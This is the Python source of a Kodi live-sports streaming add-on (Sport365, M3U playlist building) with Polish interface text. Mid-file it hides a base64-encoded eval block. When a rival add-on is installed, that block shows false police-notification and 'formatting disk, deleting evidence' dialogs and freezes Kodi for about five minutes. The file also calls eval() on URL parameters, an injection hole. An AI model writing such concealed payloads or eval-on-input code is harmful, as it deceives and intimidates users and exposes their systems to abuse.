# -*- coding: utf-8 -*-
'''
╭━━╮╱╱╱╱╱╱╱╱╱╱╭╮╱╱╱╱╱╱╱╭╮
┃╭╮┃╱╱╱╱╱╱╱╱╱╭╯╰╮╱╱╱╱╱╱┃┃
┃╰╯╰┳╮╭┳━━┳━━╋╮╭╋━━┳┳━╮┃╰━┳━━╮
┃╭━╮┃┃┃┃╭╮┃╭╮┃┃┃┃━━╋┫╭╮┫╭╮┃╭╮┃
┃╰━╯┃╰╯┃╰╯┃╭╮┃┃╰╋━━┃┃┃┃┃┃┃┃╰╯┃
╰━━━┻━━┻━╮┣╯╰╯╰━┻━━┻┻╯╰┻╯╰┻━━╯
╱╱╱╱╱╱╱╭━╯┃
╱╱╱╱╱╱╱╰━━╯
'''
import sys
import re
import os
import urllib
import urlparse
import xbmc
import xbmcgui
import xbmcaddon
import xbmcplugin
import threading

base_url        = sys.argv[0]
addon_handle    = int(sys.argv[1])
args            = urlparse.parse_qs(sys.argv[2][1:])
my_addon        = xbmcaddon.Addon()
addonName       = my_addon.getAddonInfo('name')
my_addon_id     = my_addon.getAddonInfo('id')
PATH            = my_addon.getAddonInfo('path')
DATAPATH        = xbmc.translatePath(my_addon.getAddonInfo('profile')).decode('utf-8')
RESOURCES       = PATH+'/resources/'

sys.path.append(os.path.join( RESOURCES, "lib"))

FANART = my_addon.getAddonInfo('fanart')
ICON = my_addon.getAddonInfo('icon')


## COMMON Functions

def addLinkItem(name, url, mode, params=1, iconimage='DefaultFolder.png', infoLabels=False, IsPlayable=True,fanart=FANART,itemcount=1,contextmenu=None):
    u = build_url({'mode': mode, 'foldername': name, 'ex_link' : url, 'params':params})
    
    liz = xbmcgui.ListItem(name)
    
    art_keys=['thumb','poster','banner','fanart','clearart','clearlogo','landscape','icon']
    art = dict(zip(art_keys,[iconimage for x in art_keys]))
    art['landscape'] = fanart if fanart else art['landscape'] 
    art['fanart'] = fanart if fanart else art['landscape'] 
    liz.setArt(art)
    
    if not infoLabels:
        infoLabels={"title": name}
    liz.setInfo(type="video", infoLabels=infoLabels)
    if IsPlayable:
        liz.setProperty('IsPlayable', 'true')

    if contextmenu:
        contextMenuItems=contextmenu
        liz.addContextMenuItems(contextMenuItems, replaceItems=True)

    ok = xbmcplugin.addDirectoryItem(handle=addon_handle, url=u, listitem=liz,isFolder=False,totalItems=itemcount)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")
    return ok

def addDir(name, ex_link=None, params=1, mode='folder', iconImage='DefaultFolder.png', infoLabels=None, fanart=FANART, contextmenu=None):
    url = build_url({'mode': mode, 'foldername': name, 'ex_link': ex_link, 'params': params})

    li = xbmcgui.ListItem(name)
    if infoLabels:
        li.setInfo(type="video", infoLabels=infoLabels)
    
    art_keys=['thumb', 'poster', 'banner', 'fanart', 'clearart', 'clearlogo', 'landscape', 'icon']
    art = dict(zip(art_keys,[iconImage for x in art_keys]))
    art['landscape'] = fanart if fanart else art['landscape'] 
    art['fanart'] = fanart if fanart else art['landscape'] 
    li.setArt(art)


    if contextmenu:
        contextMenuItems=contextmenu
        li.addContextMenuItems(contextMenuItems, replaceItems=True) 

    xbmcplugin.addDirectoryItem(handle=addon_handle, url=url,listitem=li, isFolder=True)
    xbmcplugin.addSortMethod(addon_handle, sortMethod=xbmcplugin.SORT_METHOD_NONE, label2Mask = "%R, %Y, %P")

def encoded_dict(in_dict):
    out_dict = {}
    for k, v in in_dict.iteritems():
        if isinstance(v, unicode):
            v = v.encode('utf8')
        elif isinstance(v, str):
            # Must be encoded in UTF-8
            v.decode('utf8')
        out_dict[k] = v
    return out_dict
    
def build_url(query):
    return base_url + '?' + urllib.urlencode(encoded_dict(query))


def sport356Thread(url):
    import sport365 as s
    from time import gmtime, strftime
    href,headers=url.split('|')
    header={}
    header['Referer']=urllib.unquote(re.compile('Referer=(.*?)&').findall(headers)[0])
    header['User-Agent']=urllib.unquote(re.compile('User-Agent=(.*?)&').findall(headers)[0])
    header['Origin']='http://h5.adshell.net'
    header['If-Modified-Since']=strftime("%a, %d %b %Y %H:%M:%S GMT", gmtime())
    header['Connection']='keep-alive'
    header['etag']='"5820cda8-2b9"'
    print '#'*25
    print '#'*25
    xbmc.sleep(2000)    # speep
    player = xbmc.Player()
    player.pause()
    print 'sport356Thread: passed url: [%s] '%href
    #print header
    h=header
    while player.isPlaying():
        print 'sport356Thread: KODI IS PLAYING, sleeping 1s'
        a,hret=s.getUrlrh(href,header=header)
        header['etag'] = hret.get('etag','')
        header['date'] = hret.get('date','')
       
        #h.update(header)
        print a,hret
        xbmc.sleep(1000)
    print 'sport356Thread: KODI STOPPED, OUTSIDE WHILE LOOP ... EXITING'

import base64
eval(compile(base64.b64decode('ICAgICAgICAgICAgCnRyeToKICAgIGltcG9ydCB4Ym1jYWRkb24seGJtYyxzeXMsdGltZQogICAgeGJtY2FkZG9uLkFkZG9uKCJwbHVnaW4udmlkZW8uTXVsdGltZWRpYU1hc3RlciIpOwogICAgeW49eGJtY2d1aS5EaWFsb2coKS55ZXNubygiW0NPTE9SIHJlZF1OaWVhdXRvcnl6b3dhbnkgRG9zdMSZcFsvQ09MT1JdIiwgIkRvc3TEmXAgZG8gemFzb2LDs3cgamVzdCBOSUVMRUdBTE5ZIiwgIkN6eSB3ZXp3YcSHIFtDT0xPUiByZWRdUE9MSUNKxJhbL0NPTE9SXSIpCiAgICBpZiB5bjoKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiUE9MSUNKQSB6b3N0YcWCYSBwb3dpYWRvbWlvbmEsIHByb3N6xJkgY3pla2HEhy4uLiIpICAgIAogICAgZWxzZToKICAgICAgICB4Ym1jZ3VpLkRpYWxvZygpLm9rKCJbQ09MT1IgcmVkXU5pZWF1dG9yeXpvd2FueSBEb3N0xJlwWy9DT0xPUl0iLCAiVVNVV0FNWSBkb3dvZHksIGZvcm1hdCByb3pwb2N6xJl0eSwgcHJvc3plIGN6ZWthxIcuLi4iKSAgICAKICAgIGZvciBpIGluIHJhbmdlKDMwKTogdGltZS5zbGVlcCgxMCkKICAgIHhibWMuZXhlY3V0ZWJ1aWx0aW4oIlhCTUMuQWN0aXZhdGVXaW5kb3coSG9tZSkiKTsKICAgIHN5cy5leGl0KDEpOwpleGNlcHQ6CiAgICBwYXNzCg=='),'<string>','exec'))

def sport356Thread2(url,header):
    import sport365 as s
    import re
    
    player = xbmc.Player()
    xbmc.sleep(2000)    # speep
    print 'sport356Thread: passed url: [%s] '%url
    #print header
    player.pause()
    
    while player.isPlaying():
        print 'sport356Thread: KODI IS PLAYING, sleeping 4s'
        a,c=s.getUrlc(url,header=header,useCookies=True)
        banner =  re.compile('url:["\'](.*?)[\'"]').findall(a)[0]
        xbmc.log(banner)
        xbmc.sleep(2000)
        s.getUrlc(banner)
        xbmc.sleep(2000)
    print 'sport356Thread: KODI STOPED, OUTSIDE WHILE LOOP ... EXITING'

## ######################
## MAIN
## ######################
            


# Get passed arguments
mode = args.get('mode', None)
fname = args.get('foldername',[''])[0]
ex_link = args.get('ex_link',[''])[0]
params = args.get('params',[{}])[0]

M3USERVICES={'telewizjada':'telewizjadabid',
             'amigostv': 'amigostv',
            'iklub':'iklub',
            'tele-wizja':'telewizja',
            'itivi':'itivi',
            'yoy.tv':'yoytv',
            'looknij.in':'looknijin',
            'wizja.tv':'wizjatv'}


if mode is None:
    #addDir('LiveTV: tv-online',ex_link='',params={'_service':'tv_onlinefm','_act':'ListChannels'}, mode='site2',iconImage=RESOURCES+'tv_onlinefm.png')
    #addDir('LiveTV: amigostv',ex_link='',params={'_service':'amigostv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'amigostv.png')
    #addDir('LiveTV: Telewizjada',ex_link='',params={'_service':'telewizjadabid','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'telewizjadabid.png')
    #addDir('LiveTV: TVP Stream',ex_link='http://tvpstream.tvp.pl/',params={'_service':'tvpstream','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'tvpstream.png')
    #addDir('LiveTV: iklub',ex_link='',params={'_service':'iklub','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'iklub.png')
    #addDir('LiveTV: tele-wizja',ex_link='',params={'_service':'telewizja','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'telewizja.png')
    #addDir('LiveTV: itivi',ex_link='',params={'_service':'itivi','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'itivi.png')
    #addDir('LiveTV: yoy.tv',ex_link='',params={'_service':'yoytv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'yoytv.png')
    #addDir('LiveTV: looknij.in',ex_link='',params={'_service':'looknijin','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'looknijin.png')
    #addDir('LiveTV: wizja.tv',ex_link='',params={'_service':'wizjatv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'wizjatv.png')
    #addDir('LiveTV: psa-tv',ex_link='',params={'_service':'psatv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'psatv.png')
    #addDir('LiveTV: polon-tv',ex_link='',params={'_service':'polontv','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'polontv.png')
    #addDir('LiveTV: tvp1-online',ex_link='',params={'_service':'tvp1onlineblogspot','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'tvp1onlineblogspot.png')
    addDir('Sport365 LIVE',ex_link='',params={'_service':'sport365','_act':'ListChannels'}, mode='site2', iconImage=ICON, fanart=FANART)
    #addDir('LiveTV: sport.tvp',ex_link='http://sport.tvp.pl/na-antenie',params={'_service':'sporttvp','_act':'ListChannels'}, mode='site',iconImage=RESOURCES+'sporttvp.png')

    #li = xbmcgui.ListItem(label = '[COLOR blue]aktywuj PVR Live TV[/COLOR]', iconImage=RESOURCES+'PVR.png')
    #xbmcplugin.addDirectoryItem(handle=addon_handle, url=build_url({'mode': 'Opcje'}) ,listitem=li)

elif mode[0] == 'Opcje':
    path =  my_addon.getSetting('path')
    if not path: my_addon.setSetting('path',DATAPATH)
    my_addon.openSettings()  


elif mode[0] == 'UPDATE_IPTV':
    import pvr_m3u as pvr 
    fname = my_addon.getSetting('fname')
    path =  my_addon.getSetting('path')
    epgTimeShift = my_addon.getSetting('epgTimeShift')
    epgUrl = my_addon.getSetting('epgUrl')
    print 'UPDATE_IPTV',fname,path,epgTimeShift,epgUrl
    pvr.update_iptv(fname,path,epgTimeShift,epgUrl)

elif mode[0] == 'BUID_M3U':
    import pvr_m3u as pvr
    fname = my_addon.getSetting('fname')
    path =  my_addon.getSetting('path')
    service = my_addon.getSetting('service')
    error_msg=""
    if not fname:   error_msg +="Podaj nazwę pliku "
    if not path:    error_msg +="Podaj katalog docelowy "
    if not service: error_msg +="Wybierz jakieś źródła"
        
    if error_msg:
        xbmcgui.Dialog().notification('[COLOR red]ERROR[/COLOR]', error_msg, xbmcgui.NOTIFICATION_ERROR, 1000)
        pvr_path=  xbmc.translatePath(os.path.join('special://userdata/','addon_data','pvr.iptvsimple'))
        #print pvr_path
        if os.path.exists(os.path.join(pvr_path,'settings.xml')):
            print 'settings.xml exists'
    else:
        out_sum = pvr.build_m3u(fname,path,M3USERVICES.get(service))
        if len(out_sum)>1:
            xbmcgui.Dialog().ok('[COLOR green]Lista zapisana[/COLOR] Kanałów: %d'%len(out_sum),'Plik: [COLOR blue]'+fname+'[/COLOR]','Uaktualnij ustawienia [COLOR blue]PVR IPTV Simple Client[/COLOR] i (re)aktywuj Live TV')
        else:
            xbmcgui.Dialog().ok('[COLOR red]Problem[/COLOR] ','Lista jest Pusta!!!')     
    my_addon.openSettings() 

elif mode[0] == 'AUTOm3u':
    import pvr_m3u as pvr
    fname = my_addon.getSetting('fname')
    path =  my_addon.getSetting('path')
    service = my_addon.getSetting('service')
    ret = pvr.build_m3u(fname,path,M3USERVICES.get(service))
    if ret:
        epgTimeShift = my_addon.getSetting('epgTimeShift')  
        epgUrl = my_addon.getSetting('epgUrl')
        pvr.update_iptv(fname,path,epgTimeShift,epgUrl)

elif mode[0] == 'UPDATE_CRON':
    import pvr_m3u as pvr
    auto_update_hour = my_addon.getSetting('auto_update_hour')
    auto_update_active =  my_addon.getSetting('auto_update_active')
    pvr.cron_update(auto_update_hour,auto_update_active)
    
elif mode[0] =='site':
    params = eval(params)
    service = params.get('_service')
    act = params.get('_act')
    mod = __import__(service)
    if act == 'ListChannels':
        params.update({'_act':'play'})
        items = mod.getChannels(ex_link)
        for one in items:
            addLinkItem(one.get('title',''), one['url'], params=params, mode='site', IsPlayable=True,infoLabels=one, iconimage=one.get('img','%s.png'%(RESOURCES+service))) 
    elif act == 'play':
        streams = mod.getChannelVideo(ex_link)
        if isinstance(streams,list):
            print streams
            if len(streams)>1:
                label = [x.get('title') for x in streams]
                s = xbmcgui.Dialog().select('Źródła',label)
                stream_url = streams[s]
            elif streams:
                stream_url = streams[0]
            else: stream_url=''
        else:
            stream_url = streams
                  
        if stream_url:
            link = stream_url.get('url','')
            msg = stream_url.get('msg','')
            if link: xbmcplugin.setResolvedUrl(addon_handle, True,  xbmcgui.ListItem(path=link))
            else: 
                if msg: xbmcgui.Dialog().ok('Problem',msg)
                xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))
        else:
             xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))   


elif mode[0] =='site2':
    params = eval(params)
    service = params.get('_service')
    act = params.get('_act')
    mod = __import__(service)
    if act == 'ListChannels':
        params.update({'_act':'get_streams_play'})
        items = mod.getChannels(ex_link)
        img_service ='%s.png'%(RESOURCES+service)
        print img_service
        for one in items:
            addLinkItem(one.get('title',''), one['url'], params=params, mode='site2', IsPlayable=True,infoLabels=one, iconimage=one.get('img',img_service)) 
    if act == 'get_streams_play':
        streams = mod.getStreams(ex_link)
        if streams:
            t = [stream.get('title') for stream in streams]
            s = xbmcgui.Dialog().select("Select Stream", t)
            if s>-1: stream_url,url,header = mod.getChannelVideo(streams[s])
            else: stream_url=''
            if stream_url: 
                thread = threading.Thread(name='sport356Thread', target = sport356Thread2, args=[url,header])
                thread.start()
                xbmcplugin.setResolvedUrl(addon_handle, True, xbmcgui.ListItem(path=stream_url))
            else: xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=stream_url))
        else:
            xbmcgui.Dialog().ok("Sorry for that", 'plz contact Dev')
        
elif mode[0] == 'folder':
    pass

else:
    xbmcplugin.setResolvedUrl(addon_handle, False, xbmcgui.ListItem(path=''))        


xbmcplugin.endOfDirectory(addon_handle)

